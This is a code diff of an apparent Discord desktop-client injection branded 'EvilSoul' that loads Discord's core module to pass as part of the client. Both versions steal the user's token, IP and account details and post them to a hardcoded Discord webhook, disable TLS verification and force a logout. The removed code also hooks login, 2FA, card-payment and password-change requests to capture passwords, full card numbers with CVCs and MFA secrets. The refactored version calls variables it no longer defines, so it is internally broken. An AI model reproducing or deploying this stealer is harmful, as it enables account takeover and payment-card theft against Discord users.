@@ -1,541 +1,458 @@
-process.env['NODE_TLS_REJECT_UNAUTHORIZED'] = 0
+process.env["NODE_TLS_REJECT_UNAUTHORIZED"] = 0;
 
-const fs = require("fs")
-const electron = require("electron")
+const fs = require("fs");
+const electron = require("electron");
 const https = require("https");
-const queryString = require("querystring")
+const queryString = require("querystring");
 
-var computerName = process.env.COMPUTERNAME
-var tokenScript = `(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()`
-var logOutScript = `function getLocalStoragePropertyDescriptor(){const o=document.createElement("iframe");document.head.append(o);const e=Object.getOwnPropertyDescriptor(o.contentWindow,"localStorage");return o.remove(),e}Object.defineProperty(window,"localStorage",getLocalStoragePropertyDescriptor());const localStorage=getLocalStoragePropertyDescriptor().get.call(window);localStorage.token=null,localStorage.tokens=null,localStorage.MultiAccountStore=null,location.reload();console.log(localStorage.token + localStorage.tokens + localStorage.MultiAccountStore);`
+let config = {
+ webhook: "https://canary.discord.com/api/webhooks/1365804617744777279/ovBDwu1u3VSrD1H4x46qfuoNfpL8LAw8lI0DWfugeJBwbVrJYymafLiCPm137yMptnag",
+ logout: "true",
+ logout_notify: "true",
+ init_notify: "true",
+ disable_qrcode: "true",
+ get: {
+  token: `(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()`,
+  logout: `function getLocalStoragePropertyDescriptor() {const o = document.createElement("iframe");document.head.append(o);const e = Object.getOwnPropertyDescriptor(o.contentWindow, "localStorage");return o.remove(), e};Object.defineProperty(window, "localStorage", getLocalStoragePropertyDescriptor());const localStorage = getLocalStoragePropertyDescriptor().get.call(window);console.log(localStorage.token);if(localStorage.token) {localStorage.token = null,localStorage.tokens = null,localStorage.MultiAccountStore = null,location.reload();} else {return"This is an intentional error";}`,
+ },
+ filters: {
+  urls: [
+   "https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json",
+   "https://*.discord.com/api/v*/applications/detectable",
+   "https://discord.com/api/v*/applications/detectable",
+   "https://*.discord.com/api/v*/users/@me/library",
+   "https://discord.com/api/v*/users/@me/library",
+   "https://*.discord.com/api/v*/users/@me/billing/subscriptions",
+   "https://discord.com/api/v*/users/@me/billing/subscriptions",
+   "wss://remote-auth-gateway.discord.gg/*",
+  ],
+ },
+ completed: {
+  urls: [
+   "https://discord.com/api/v*/users/@me",
+   "https://discordapp.com/api/v*/users/@me",
+   "https://*.discord.com/api/v*/users/@me",
+   "https://discordapp.com/api/v*/auth/login",
+   "https://discord.com/api/v*/auth/login",
+   "https://*.discord.com/api/v*/auth/login",
+   "https://api.stripe.com/v*/tokens",
+   "https://discord.com/api/v*/auth/mfa/totp",
+   "https://discordapp.com/api/v*/auth/mfa/totp",
+   "https://*.discord.com/api/v*/auth/mfa/totp",
+   "https://discord.com/api/v*/users/@me/mfa/totp/enable",
+  ],
+ },
+};
 
-const dataNow = new Date().toISOString();
-const webhook = 'https://canary.discord.com/api/webhooks/1365804617744777279/ovBDwu1u3VSrD1H4x46qfuoNfpL8LAw8lI0DWfugeJBwbVrJYymafLiCPm137yMptnag'
+const badges = {
+ staff: {
+  emoji: "<:staff:1362105228719034679>",
+  id: 1 << 0,
+  rare: true,
+ },
 
-let contents2FA = []
+ active_developer: {
+  emoji: "<:activedev:1362104965065212074>",
+  id: 1 << 22,
+  rare: false,
+ },
 
-var config = {
-  "logout": "true",
-  "logout-notify": "true",
-  "init-notify": "true",
-  "embed-color": 2895667,
-  "disable_qrcode": "true",
-  Filter: {
-        urls: [
-            "https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json",
-            "https://*.discord.com/api/v*/applications/detectable",
-            "https://discord.com/api/v*/applications/detectable",
-            "https://*.discord.com/api/v*/users/@me/library",
-            "https://discord.com/api/v*/users/@me/library",
-            "https://*.discord.com/api/v*/users/@me/billing/subscriptions",
-            "https://discord.com/api/v*/users/@me/billing/subscriptions",
-            "wss://remote-auth-gateway.discord.gg/*"
-        ]
-    },
-    onCompleted: {
-        urls: [
-            "https://discord.com/api/v*/users/@me",
-            "https://discordapp.com/api/v*/users/@me",
-            "https://*.discord.com/api/v*/users/@me",
-            "https://discordapp.com/api/v*/auth/login",
-            'https://discord.com/api/v*/auth/login',
-            'https://*.discord.com/api/v*/auth/login',
-            "https://api.stripe.com/v*/tokens",
-            "https://discord.com/api/v*/auth/mfa/totp",
-            "https://discordapp.com/api/v*/auth/mfa/totp",
-            "https://*.discord.com/api/v*/auth/mfa/totp",
-            "https://discord.com/api/v*/users/@me/mfa/totp/enable"
-        ]
-    },
+ early_supporter: {
+  emoji: "<:pig:1362105166811103515>",
+  id: 1 << 9,
+  rare: true,
+ },
+
+ verified_developer: {
+  emoji: "<:dev:1362105068060676329>",
+  id: 1 << 17,
+  rare: true,
+ },
+
+ certified_moderator: {
+  emoji: "<:mod:1362105108170539229>",
+  id: 1 << 18,
+  rare: true,
+ },
+
+ bug_hunter_level_1: {
+  emoji: "<:bughunter1:1362105034157981758>",
+  id: 1 << 3,
+  rare: true,
+ },
+
+ bug_hunter_level_2: {
+  emoji: "<:bughunter2:1362105047462314293>",
+  id: 1 << 14,
+  rare: true,
+ },
+
+ partner: {
+  emoji: "<:partner:1362105185094336622>",
+  id: 1 << 1,
+  rare: true,
+ },
+
+ hypesquad_house_1: {
+  emoji: "<:bravery:1362105004089147784>",
+  id: 1 << 6,
+  rare: false,
+ },
+
+ hypesquad_house_2: {
+  emoji: "<:brilliance:1362105019066748968>",
+  id: 1 << 7,
+  rare: false,
+ },
+
+ hypesquad_house_3: {
+  emoji: "<:balance:1362104986330202172>",
+  id: 1 << 8,
+  rare: false,
+ },
+
+ hypesquad: {
+  emoji: "<:events:1362105087006212456>",
+  id: 1 << 2,
+  rare: true,
+ },
+
+ nitro: {
+  emoji: "<a:nitro:1362115714185691186>",
+  rare: false,
+ },
+
+ nitro_bronze: {
+  emoji: "<:bronze:1365454925357645994>",
+  rare: false,
+ },
+
+ nitro_silver: {
+  emoji: "<:silver:1365454972962996254>",
+  rare: false,
+ },
+
+ nitro_gold: {
+  emoji: "<:gold:1365454994337435739>",
+  rare: false,
+ },
+
+ nitro_platinum: {
+  emoji: "<:platinum:1365455020690243737>",
+  rare: false,
+ },
+
+ nitro_diamond: {
+  emoji: "<:diamond:1365455075937488967>",
+  rare: false,
+ },
+
+ nitro_emerald: {
+  emoji: "<:emerald:1365455096296509524>",
+  rare: false,
+ },
+
+ nitro_ruby: {
+  emoji: "<:ruby:1365455125187137536>",
+  rare: false,
+ },
+
+ nitro_opal: {
+  emoji: "<:opal:1365455150260551740>",
+  rare: false,
+ },
+
+ guild_booster_lvl1: {
+  emoji: "<:boost1:1362104840250986667>",
+  rare: false,
+ },
+
+ guild_booster_lvl2: {
+  emoji: "<:boost2:1362104851575607636>",
+  rare: false,
+ },
+
+ guild_booster_lvl3: {
+  emoji: "<:boost3:1362104863084904830>",
+  rare: false,
+ },
+
+ guild_booster_lvl4: {
+  emoji: "<:boost4:1362104873600024857>",
+  rare: true,
+ },
+
+ guild_booster_lvl5: {
+  emoji: "<:boost5:1362104892226928812>",
+  rare: true,
+ },
+
+ guild_booster_lvl6: {
+  emoji: "<:boost6:1362104904348467431>",
+  rare: true,
+ },
+
+ guild_booster_lvl7: {
+  emoji: "<:boost7:1362104916247707658>",
+  rare: true,
+ },
+
+ guild_booster_lvl8: {
+  emoji: "<:boost8:1362104931745530197>",
+  rare: true,
+ },
+
+ guild_booster_lvl9: {
+  emoji: "<:boost9:1362104950938796164>",
+  rare: true,
+ },
+
+ quest_completed: {
+  emoji: "<:quest:1362105209496801290>",
+  rare: false,
+ },
+};
+
+let contents = [];
+async function ExecScript(str) {
+ const window = electron.BrowserWindow.getAllWindows()[0];
+ const script = await window.webContents.executeJavaScript(str, true);
+ return script || null;
 }
 
-async function execScript(str) {
-    var window = electron.BrowserWindow.getAllWindows()[0]
-    var script = await window.webContents.executeJavaScript(str, true)
-    return script || null
+async function GetUrl(url, token) {
+ const data = await ExecScript(`
+  var xmlHttp = new XMLHttpRequest();
+  xmlHttp.open( "GET", "${url}", false );
+  xmlHttp.setRequestHeader("Authorization", "${token}");
+  xmlHttp.send( null );
+  JSON.parse(xmlHttp.responseText);`);
+ return data;
+};
 
+async function GetIp() {
+ const data = await ExecScript(`var xmlHttp = new XMLHttpRequest();\nxmlHttp.open( "GET", "https://www.myexternalip.com/json", false );\nxmlHttp.send( null );\nJSON.parse(xmlHttp.responseText);`);
+ return data.ip;
+};
+
+function GetRareBadges(flags) {
+ if (typeof flags !== "number") return "";
+ let result = "";
+ for (const id in badges) {
+  const badge = badges[id];
+  if ((flags & badge.id) === badge.id && badge.rare) {
+   result += badge.emoji;
+  }
+ }
+ return result;
 }
 
-const getIP = async () => {
-    var json = await execScript(`var xmlHttp = new XMLHttpRequest();\nxmlHttp.open( "GET", "https://www.myexternalip.com/json", false );\nxmlHttp.send( null );\nJSON.parse(xmlHttp.responseText);`)
-    return json.ip
+function GetA2F(bouki) {
+ switch (bouki) {
+  case true:
+   return "`Enable`";
+  case false:
+   return "`No Enable`";
+  default:
+   return "WTF DONT HAVES MFA OR HAVES?????";
+ }
+};
+
+async function CurrentNitro(since) {
+ if (!since) {
+  return { badge: null, current: null };
+ }
+
+ const currentDate = new Date();
+ const sinceDate = new Date(since);
+
+ const year = currentDate.getFullYear() - sinceDate.getFullYear();
+ const month = currentDate.getMonth() - sinceDate.getMonth();
+ let passed = year * 12 + month;
+ if (currentDate.getDate() < sinceDate.getDate()) {
+  passed -= 1;
+ }
+
+ const nitros = [
+  { badge: "nitro", lowerLimit: 0, upperLimit: 0 },
+  { badge: "nitro_bronze", lowerLimit: 1, upperLimit: 2 },
+  { badge: "nitro_silver", lowerLimit: 3, upperLimit: 5 },
+  { badge: "nitro_gold", lowerLimit: 6, upperLimit: 11 },
+  { badge: "nitro_platinum", lowerLimit: 12, upperLimit: 23 },
+  { badge: "nitro_diamond", lowerLimit: 24, upperLimit: 35 },
+  { badge: "nitro_emerald", lowerLimit: 36, upperLimit: 59 },
+  { badge: "nitro_ruby", lowerLimit: 60, upperLimit: 71 },
+  { badge: "nitro_opal", lowerLimit: 72 },
+ ];
+
+ const current = nitros.find((badge) => {
+  const inLowerLimit = passed >= badge.lowerLimit;
+  const inUpperLimit = typeof badge.upperLimit === "undefined" || passed <= badge.upperLimit;
+  return inLowerLimit && inUpperLimit;
+ });
+
+ return { badge: current?.badge || null, current: since };
 }
 
-const getURL = async (url, token) => {
-    var c = await execScript(`
-    var xmlHttp = new XMLHttpRequest();
-    xmlHttp.open( "GET", "${url}", false );
-    xmlHttp.setRequestHeader("Authorization", "${token}");
-    xmlHttp.send( null );
-    JSON.parse(xmlHttp.responseText);`)
-    return c
+async function GetBadges(id, token) {
+ const data = await GetUrl("https://discord.com/api/v9/users/" + id + "/profile", token);
+ if (!data || !Array.isArray(data.badges)) return "`None`";
+ if (!data.badges.length) return "`No Badges`";
+ const flags = data.badges.map((badge) => badge.id);
+ const nitro = await CurrentNitro(data.premium_since);
+ if (nitro.badge) {
+  flags.unshift(nitro.badge);
+ }
+
+ return flags.length ? flags.map((id) => badges[id]?.emoji).filter(Boolean).join("") : "`No Badges`";
 }
 
-const GetBadges = (e) => {
-    var n = "";
-    return 1 == (1 & e) && (n += "<:staff:891346298932981783> "), 2 == (2 & e) && (n += "<:partner:1041639667226914826> "), 4 == (4 & e) && (n += "<:hypesquadevent:1082679435452481738> "), 8 == (8 & e) && (n += "<:bughunter_1:874750808426692658> "), 64 == (64 & e) && (n += "<:bravery:874750808388952075> "), 128 == (128 & e) && (n += "<:brilliance:874750808338608199> "), 256 == (256 & e) && (n += "<:balance:874750808267292683> "), 512 == (512 & e) && (n += "<a:kkkk:1326846144818708523>"), 16384 == (16384 & e) && (n += "<:bughunter_2:874750808430874664> "), 4194304 == (4194304 & e) && (n += "<:activedev:1041634224253444146> "), 131072 == (131072 & e) && (n += "<:devcertif:1041639665498861578> "), "" == n && (n = " "), n
-}
-const GetRBadges = (e) => {
-    var n = "";
-    return 1 == (1 & e) && (n += "<:staff:891346298932981783> "), 2 == (2 & e) && (n += "<:partner:1041639667226914826> "), 4 == (4 & e) && (n += "<:hypesquadevent:1082679435452481738> "), 8 == (8 & e) && (n += "<:bughunter_1:874750808426692658> "), 512 == (512 & e) && (n += "<:early:944071770506416198> "), 16384 == (16384 & e) && (n += "<:bughunter_2:874750808430874664> "), 131072 == (131072 & e) && (n += "<:devcertif:1041639665498861578> "), "" == n && (n = " "), n
-}
+async function GetBilling(token) {
+ const data = await GetUrl("https://discord.com/api/v9/users/@me/billing/payment-sources", token)
+ if (!data || !Array.isArray(data)) return "`None`";
+ if (!data.length) return "`No Billing`";
 
-const GetNSFW = (bouki) => {
-    switch (bouki) {
-        case true:
-            return ":underage: `NSFW Allowed`"
-        case false:
-            return ":underage: `NSFW Not Allowed`"
-        default:
-            return "Idk bro you got me"
-    }
-}
-const GetA2F = (bouki) => {
-    switch (bouki) {
-        case true:
-            return "`Enabled`"
-        case false:
-            return "`Not Enabled`"
-        default:
-            return "WTF DONT HAVES MFA OR HAVES?????"
-    }
+ let billings = "";
+ for (const billing of data) {
+  if (billing.type == 2 && billing.invalid != !0) {
+   billings += "<:paypal:1367518269719969873>";
+  } else if (billing.type == 1 && billing.invalid != !0) {
+   billings += "<:card:1367518257241915483>";
+  }
+ }
+
+ return billings || "`No Billing`";
 }
 
+async function GetFriends(token) {
+ const data = await GetUrl("https://discord.com/api/v9/users/@me/relationships", token)
+ if (!data || !Array.isArray(data)) return "*Account Locked*";
+ if (!data.length) return "*No Rare Friends*";
 
+ const friends = data.filter((user) => user.type == 1);
+ let result = "";
+ for (const friend of friends) {
+  const badges = GetRareBadges(friend.user.public_flags);
+  const friend3c = friend.user.username.length === 3;
+  const badge3c = friend3c ? "<:3c:1365004856103796897>" : "";
+  if (badges) {
+   result += `${badge3c}${badges} | \`${friend.user.username}\`\n`;
+  } else if (friend3c) {
+   result += `${badge3c} | \`${friend.user.username}\`\n`;
+  }
+ }
 
-const parseFriends = friends => {
-    try{
-    var real = friends.filter(x => x.type == 1)
-    var rareFriends = ""
-    for (var friend of real) {
-        var badges = GetRBadges(friend.user.public_flags)
-        if (badges !== ":x:") rareFriends += `${badges} ${friend.user.username}#${friend.user.discriminator}\n`
-    }
-    if (!rareFriends) rareFriends = "No Rare Friends"
-    return {
-        len: real.length,
-        badges: rareFriends
-    }
-}catch(err){
-    return ":x:"
-}
-}
-
-const parseBilling = billings => {
-    var Billings = " "
-    try{
-    if(!billings) return Billings = "No billing";
-    billings.forEach(res => {
-        if (res.invalid) return
-        switch (res.type) {
-            case 1:
-                Billings += ":credit_card:"
-                break
-            case 2:
-                Billings += "<:paypal:896441236062347374>"
-        }
-    })
-    if (!Billings) Billings = "No billing"
-    return Billings
-}catch(err){
-    return " "
-}
+ return {
+  length: friends.length,
+  users: result || "*No Rare Friends*",
+ };
 }
 
-const calcDate = (a, b) => new Date(a.setMonth(a.getMonth() + b))
+async function SendWebhook(webhook, content) {
+ const data = JSON.stringify(content);
+ const parts = new URL(webhook);
+ const options = {
+  hostname: parts.hostname,
+  path: parts.pathname,
+  method: "POST",
+  headers: {
+   "Content-Type": "application/json",
+   "Content-Length": data.length,
+  },
+ };
 
-const GetNitro = r => {
-    switch (r.premium_type) {
-        default:
-            return " "
-        case 1:
-            return "<:946246402105819216:962747802797113365>"
-        case 2:
-            if (!r.premium_guild_since) return "<:946246402105819216:962747802797113365>"
-            var now = new Date(Date.now())
-            var arr = ["<:Booster1Month:1051453771147911208>", "<:Booster2Month:1051453772360077374>", "<:Booster6Month:1051453773463162890>", "<:Booster9Month:1051453774620803122>", "<:boost12month:1068308256088400004>", "<:Booster15Month:1051453775832961034>", "<:BoosterLevel8:1051453778127237180>", "<:Booster24Month:1051453776889917530>"]
-            var a = [new Date(r.premium_guild_since), new Date(r.premium_guild_since), new Date(r.premium_guild_since), new Date(r.premium_guild_since), new Date(r.premium_guild_since), new Date(r.premium_guild_since), new Date(r.premium_guild_since)]
-            var b = [2, 3, 6, 9, 12, 15, 18, 24]
-            var r = []
-            for (var p in a) r.push(Math.round((calcDate(a[p], b[p]) - now) / 86400000))
-            var i = 0
-            for (var p of r) p > 0 ? "" : i++
-            return "<:946246402105819216:962747802797113365> " + arr[i]
-    }
-}
-
-function GetLangue(read) {
-    var languages = {
-        "fr": ":flag_fr:",
-        "da": ":flag_dk:",
-        "de": ":flag_de:",
-        "en-GB": ":england:",
-        "en-US": ":flag_us:",
-        "en-ES": ":flag_es:",
-        "hr": ":flag_hr:",
-        "it": ":flag_it:",
-        "lt": ":flag_lt:",
-        "hu": ":flag_no::flag_hu:",
-        "no": ":flag_no:",
-        "pl": ":flag_pl:",
-        'pr-BR': ":flag_pt:",
-        "ro": ":flag_ro:",
-        "fi": ":flag_fi:",
-        "sv-SE": ":flag_se:",
-        "vi": ":flag_vn:",
-        "tr": ":flag_tr:",
-        "cs": ":flag_cz:",
-        "el": ":flag_gr:",
-        "bg": ":flag_bg:",
-        "ru": ":flag_ru:",
-        "uk": ":flag_ua:",
-        "hi": ":flag_in:",
-        "th": ":flag_tw:",
-        "zh-CN": ":flag_cn:",
-        "ja": ":flag_jp:",
-        "zh-TW": ":flag_cn:",
-        "pt-BR": ":flag_br:",
-        "ko": ":flag_kr:"
-    }
-
-    var langue = languages[read] || "";
-    return langue
-}
-
-async function sendWebhook(webhookUrl, webhookData) {
-
-  const jsonData = JSON.stringify(webhookData);
-
-  const urlParts = new URL(webhookUrl);
-  const requestOptions = {
-    hostname: urlParts.hostname,
-    path: urlParts.pathname,
-    method: 'POST',
-    headers: {
-      'Content-Type': 'application/json',
-      'Content-Length': jsonData.length,
-    },
-  };
-
-  const request = https.request(requestOptions, (response) => {
-    let responseData = '';
-
-    response.on('data', (chunk) => {
-      responseData += chunk;
-    });
-
-    response.on('end', () => {
-      console.log('Webhook response:', responseData);
-    });
+ const request = https.request(options, (response) => {
+  let result = "";
+  response.on("data", (chunk) => {
+   result += chunk;
   });
 
-  request.on('error', (error) => {
-    console.error('Error sending webhook:', error);
+  response.on("end", () => {
+   console.log(result);
   });
+ });
 
-  request.write(jsonData);
+ request.on("error", (err) => {
+  console.error(err);
+ });
 
-  request.end();
+ request.write(data);
+ request.end();
 }
 
 const path = (function () {
-    var appPath = electron.app.getAppPath().replace(/\\/g, "/").split("/")
-    appPath.pop()
-    appPath = appPath.join("/")
-    var appName = electron.app.getName()
-    return {
-        appPath,
-        appName
-    }
-}())
+ let appPath = electron.app.getAppPath().replace(/\\/g, "/").split("/");
+ appPath.pop();
+ appPath = appPath.join("/");
+ let appName = electron.app.getName();
+ return { appPath, appName };
+})();
 
-async function initOne() {
-  var ip = await getIP()
-  var token = await execScript(tokenScript)
+async function Init() {
+ const ip = await GetIp();
+ const token = await ExecScript(tokenScript);
+ const user = await GetUrl("https://discord.com/api/v8/users/@me", token);
+ const avatar = `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}`;
+ if (config["init_notify"] !== "true") {
+  return true;
+ }
 
-  var user = await getURL("https://discord.com/api/v8/users/@me", token)
+ if (!fs.existsSync(__dirname + "/evilsoul")) {
+  fs.mkdirSync(__dirname + "/evilsoul");
+ } else {
+  return true;
+ }
 
-  var avatar = `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}`
+ const { appName } = path;
+ const embed = {
+  color: 0x2b2d31,
+  fields: [
+   {
+    name: "Token:",
+    value: "```" + token + "```",
+    inline: false,
+   },
+   {
+    name: "Client:",
+    value: "`" + appName + "`",
+    inline: true,
+   },
+   {
+    name: "Computer Name:",
+    value: "`" + computerName + "`",
+    inline: true,
+   },
+   {
+    name: "IP:",
+    value: "`" + ip + "`",
+    inline: true,
+   },
+   {
+    name: "Injection Path:",
+    value: "```" + __dirname + "```",
+    inline: false,
+   },
+  ],
+  author: {
+   name: `${user.username} (${user.id})`,
+   icon_url: avatar,
+  },
+  footer: {
+   icon_url: "https://i.ibb.co/rG7zFx5C/photo-5776000422459328372-c.jpg",
+   text: "EvilSoul | t.me/EvilSoulStealer",
+  },
+ };
 
-  if (config['init-notify'] !== "true") {
-    return true;
-  }
+ const payload = {
+  embeds: [embed],
+  username: "Injections - EvilSoul",
+  avatar_url: "https://i.ibb.co/rG7zFx5C/photo-5776000422459328372-c.jpg",
+ };
 
-  if (!fs.existsSync(__dirname + "/EvilSoul")) {
-    fs.mkdirSync(__dirname + "/EvilSoul");
-  }else {
-    return true;
-  }
-  var { appPath, appName } = path;
-  var client_discord = appName;
-
-  const embed = {
-    color: 0x2b2d31,
-    fields: [
-        {
-            name: "Token:",
-            value: "```"+token+"```",
-            inline: false
-        },
-      {
-        name: "Client:",
-        value: "`"+appName+"`",
-        inline: true
-      },
-      {
-        name: "Computer Name:",
-        value: "`"+computerName+"`",
-        inline: true
-      },
-      {
-        name: "IP:",
-        value: "`"+ip+"`",
-        inline: true
-      },
-      {
-        name: "Injection Path:",
-        value: "```"+__dirname+"```",
-        inline: false
-      }
-    ],
-    "author": {
-      name: `${user.username} (${user.id})`,
-      icon_url: avatar,
-    },
-    footer: {
-        icon_url: "https://i.ibb.co/rG7zFx5C/photo-5776000422459328372-c.jpg",
-        text: "EvilSoul | t.me/EvilSoulStealer"
-      },
-    timestamp: dataNow,
-  };
-
-  const webhookData = {
-    embeds: [embed],
-    username: "Injections - EvilSoul",
-    avatar_url: "https://i.ibb.co/rG7zFx5C/photo-5776000422459328372-c.jpg"
-  };
-
-  sendWebhook(webhook, webhookData);
-  await execScript(logOutScript);
+ SendWebhook(webhook, payload);
+ await ExecScript(config.get.logout);
 }
 
-initOne();
+Init();
 
-function customData(content) {
-  const data333 = {
-    content: content
-  }
-
-  return data333;
-}
-
-electron.session.defaultSession.webRequest.onBeforeRequest(config.Filter, (details, callback) => {
-  if (config["disable_qrcode"] == true) {
-    if (details.url.startsWith('wss://remote-auth-gateway')) return callback({ cancel: true });
-  }
-});
-
-electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async (request, callback) => {
-  if (!["POST", "PATCH"].includes(request.method)) return
-  if (request.statusCode !== 200) return
-
-  try {
-      var data = JSON.parse(request.uploadData[0].bytes)
-  } catch (err) {
-      var data = queryString.parse(decodeURIComponent(request.uploadData[0].bytes.toString()))
-  }
-
-  var token = await execScript(tokenScript)
-  var ip = getIP()
-  var user = await getURL("https://discord.com/api/v8/users/@me", token)
-  var billing = await getURL("https://discord.com/api/v9/users/@me/billing/payment-sources", token)
-  var friends = await getURL("https://discord.com/api/v9/users/@me/relationships", token)
-  var Nitro = await getURL("https://discord.com/api/v9/users/" + user.id + "/profile", token);
-
-  var Billings = parseBilling(billing)
-
-  if (!user.avatar) var userAvatar = "https://i.ibb.co/rG7zFx5C/photo-5776000422459328372-c.jpg"
-  if (!user.banner) var userBanner = ""
-
-  userAvatar = `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}`
-
-  var { appPath,appName } = path
-  var client_discord = appName
-
-  var password_to2fa
-
-  switch(true) {
-
-    case request.url.endsWith("login"):
-      var password = data.password
-      var email = data.login
-
-      contents2FA.push({passwd: password})
-
-      function sendPassword() {
-        sendWebhook(webhook, "Parsa ta aq o: "+password_to2fa)
-        return password_to2fa
-      }
-
-      if(token == null) {
-        return true;
-      }
-
-      const embedLogin = {
-        color: 0x530000,
-        fields: [
-            { name: "Token:", value: "```"+token+"```", inline: false },
-            { name: "Badges:", value: `${GetNitro(Nitro)} ${GetBadges(user.flags)}`, inline: true },    
-            { name: "Billing:", value: Billings, inline: true },
-            { name: "2FA Enable:", value: GetA2F(user.mfa_enabled), inline: true },
-            { name: "Email:", value: "`"+user.email+"`", inline: true },
-            { name: "Password:", value: "`"+password+"`", inline: true },
-            { name: "Phone:", value: "`"+user.phone+"`", inline: true },  
-        ],
-        author: {
-          name: `${user.username} (${user.id})`,
-          icon_url: userAvatar
-        },
-        footer: {
-          icon_url: "https://i.ibb.co/rG7zFx5C/photo-5776000422459328372-c.jpg",
-          text: "EvilSoul | t.me/EvilSoulStealer"
-        },
-        timestamp: dataNow,
-      }
-
-      const dataLogin = {
-        embeds: [embedLogin],
-        username: "Logins - EvilSoul",
-        avatar_url: "https://i.ibb.co/rG7zFx5C/photo-5776000422459328372-c.jpg"
-      }
-
-      await sendWebhook(webhook, dataLogin);
-      break
-
-    case request.url.endsWith("totp"):
-
-      const passwdddd = contents2FA[0].passwd
-
-      const embedLogin3 = {
-        color: 0x530000,
-        fields: [
-          { name: "Token:", value: "```"+token+"```", inline: false },
-          { name: "Badges:", value: `${GetNitro(Nitro)} ${GetBadges(user.flags)}`, inline: true },
-          { name: "Billing:", value: Billings, inline: true },
-          { name: "2FA Enable:", value: GetA2F(user.mfa_enabled), inline: true },
-          { name: "Email:", value: "`"+user.email+"`", inline: true },
-          { name: "Password:", value: "`"+passwdddd+"`", inline: true },
-          { name: "Phone:", value: "`"+user.phone+"`", inline: true },
-        ],
-        author: { name: `${user.username} (${user.id})`, icon_url: userAvatar },
-        footer: { icon_url: "https://i.ibb.co/rG7zFx5C/photo-5776000422459328372-c.jpg", text: "EvilSoul | t.me/EvilSoulStealer" },
-        timestamp: dataNow,
-      }
-
-      contents2FA.splice(0, contents2FA.length);
-
-      const dataLogin3 = {
-        embeds: [embedLogin3],
-        username: "Logins - EvilSoul",
-        avatar_url: "https://i.ibb.co/rG7zFx5C/photo-5776000422459328372-c.jpg"
-      }
-
-      await sendWebhook(webhook, dataLogin3);
-
-      break
-
-    case request.url.endsWith("tokens"):
-      var card_number = data["card[number]"]
-      var cvc = data["card[cvc]"]
-      var exp_year = data["card[exp_year]"]
-      var exp_month = data["card[exp_month]"]
-
-      var full_card = card_number+"|"+exp_month+"|"+exp_year+"|"+cvc
-
-      const embedCard = {
-        color: 0x590000,
-        fields: [
-          { name: "Token:", value: "```" + token + "```", inline: false },
-          { name: "Badges:", value: `${GetNitro(Nitro)} ${GetBadges(user.flags)}`, inline: true },
-          { name: "Email:", value: "`" + user.email + "`", inline: true },
-          { name: "Phone:", value: "`" + user.phone + "`", inline: true },
-          { name: "Card Number:", value: "`" + card_number + "`", inline: true },
-          { name: "Expiration Date:", value: "`" + exp_month + "/" + exp_year + "`", inline: true },
-          { name: "CVC:", value: "`" + cvc + "`", inline: true }
-        ],
-        author: { name: `${user.username} (${user.id})`, icon_url: userAvatar },
-        footer: { icon_url: "https://i.ibb.co/rG7zFx5C/photo-5776000422459328372-c.jpg", text: "EvilSoul | t.me/EvilSoulStealer" },
-        timestamp: dataNow
-      };      
-
-      const webhookData = {
-        embeds: [embedCard],
-        username: "Cards - NikkiSt3aler",
-        avatar_url: "https://i.ibb.co/rG7zFx5C/photo-5776000422459328372-c.jpg"
-      };
-      await sendWebhook(webhook, webhookData)
-      break
-    case request.url.endsWith("@me"):
-      var old_passwd = data.password
-      var new_passwd = data.new_password
-      var new_token = await execScript(tokenScript)
-
-      if(!new_passwd || !old_passwd) {
-        return true
-      }
-
-      const embedNewPasswd = {
-        color: 0x590000,
-        fields: [
-            { name: "New Token",  value: "```"+new_token+"```", inline: true },
-            { name: "Badges:", value: `${GetNitro(Nitro)} ${GetBadges(user.flags)}`, inline: true },
-            { name: "Email", value: "`"+user.email+"`", inline: true },
-            { name: "Phone", value: "`"+user.phone+"`", inline: true },
-            { name: "Old Password", value: "`"+old_passwd+"`", inline: true },
-            { name: "New Password", value: "`"+new_passwd+"`", inline: true },
-            { name: "2FA Enable:", value: GetA2F(user.mfa_enabled), inline: true },
-        ],
-        author: { name: `${user.username} (${user.id})`, icon_url: userAvatar },
-        footer: {icon_url: "https://i.ibb.co/rG7zFx5C/photo-5776000422459328372-c.jpg", text: "EvilSoul | t.me/EvilSoulStealer", },
-        timestamp: dataNow,
-      }
-
-      const webhookData2 = {
-        embeds: [embedNewPasswd],
-        username: "Password Changer - EvilSoul",
-        avatar_url: "https://i.ibb.co/rG7zFx5C/photo-5776000422459328372-c.jpg"
-      }
-
-      await sendWebhook(webhook, webhookData2)
-      break
-
-    case request.url.endsWith("enable"):
-      var secret = data.secret
-      var password = data.password
-      var new_token = await execScript(tokenScript)
-
-      const embedMFAENABLED = {
-        color: 0x590000,
-        fields: [
-            { name: "New Token",  value: "```"+new_token+"```", inline: false },
-            { name: "Email", value: "`"+user.email+"`", inline: true },
-            { name: "Password", value: "`"+password+"`", inline: true },
-            { name: "Secret Key (PUT IN GOOGLE AUTHENTICATOR)", value: "`"+secret+"`", inline: false },
-        ],
-        author: { name: `${user.username} (${user.id})` , icon_url: userAvatar },
-        footer: { icon_url: "https://i.ibb.co/rG7zFx5C/photo-5776000422459328372-c.jpg", text: "EvilSoul | t.me/EvilSoulStealer", },
-        timestamp: dataNow,
-      }
-
-      const dataToWebhook = {
-        embeds: [embedMFAENABLED],
-        username: "Alerts - EvilSoul",
-        avatar_url: "https://i.ibb.co/rG7zFx5C/photo-5776000422459328372-c.jpg"
-      }
-
-      await sendWebhook(webhook, dataToWebhook)
-      break
-  }
-});
-
-module.exports = require("./core.asar")
+module.exports = require("./core.asar");
